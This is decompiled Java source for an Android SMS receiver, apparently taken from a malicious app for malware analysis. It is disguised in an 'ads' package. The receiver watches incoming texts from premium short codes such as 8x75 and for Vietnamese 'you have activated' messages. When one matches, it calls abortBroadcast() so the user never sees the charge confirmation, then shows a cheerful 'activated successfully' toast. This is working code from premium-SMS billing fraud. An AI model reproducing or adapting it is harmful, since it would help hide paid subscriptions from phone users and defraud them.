package com.example.lw.appkeys.com.ads;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.SmsMessage;
import android.widget.Toast;
import java.util.Locale;

public class Receiver
  extends BroadcastReceiver
{
  private static SharedPreferences a;
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    a = PreferenceManager.getDefaultSharedPreferences(paramContext);
    paramIntent = paramIntent.getExtras();
    if (paramIntent == null) {
      return;
    }
    paramIntent = (Object[])paramIntent.get("pdus");
    int i = 0;
    label29:
    if (i < paramIntent.length)
    {
      Object localObject = SmsMessage.createFromPdu((byte[])paramIntent[i]);
      String str = ((SmsMessage)localObject).getOriginatingAddress();
      if ((str.matches("[+]*8[0-7]75")) || (str.matches(a.getString("NUM_BLOK", " "))))
      {
        localObject = ((SmsMessage)localObject).getMessageBody().toString();
        if ((((String)localObject).startsWith("Ban da kich hoat")) || (((String)localObject).startsWith(a.getString("MSG_BLOK", " "))))
        {
          paramContext.sendBroadcast(new Intent("SMS_RECEIVE").putExtra("get_msg", (String)localObject));
          abortBroadcast();
          if (!Locale.getDefault().getLanguage().equals("vi")) {
            break label178;
          }
          Toast.makeText(paramContext, "Ứng dụng đã được kích hoạt thành công, chúc bạn vui vẻ!", 1).show();
        }
      }
    }
    for (;;)
    {
      i += 1;
      break label29;
      break;
      label178:
      Toast.makeText(paramContext, "Application have been activated successfully, have fun!", 1).show();
    }
  }
}


/* Location:           F:\四个案例的jar\无线网钥匙\classes-dex2jar.jar
 * Qualified Name:     com.ads.Receiver
 * JD-Core Version:    0.7.0-SNAPSHOT-20130630
 */